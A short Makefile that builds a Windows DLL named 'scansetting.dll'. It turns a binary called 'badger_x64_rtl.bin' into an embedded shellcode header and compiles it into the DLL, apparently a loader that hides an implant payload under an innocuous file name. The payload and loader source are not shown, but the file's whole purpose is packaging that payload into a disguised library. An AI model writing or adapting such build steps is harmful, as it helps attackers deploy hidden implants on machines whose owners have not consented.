build:
	mv badger_x64_rtl.bin badger.bin
	xxd -i badger.bin > shellcode.h
	x86_64-w64-mingw32-gcc main.c -o scansetting.dll -DBUILD_DLL -shared -s -O2

clean:
	rm -rf shellcode.h scansetting.dll badger_x64_rtl.bin badger.bin
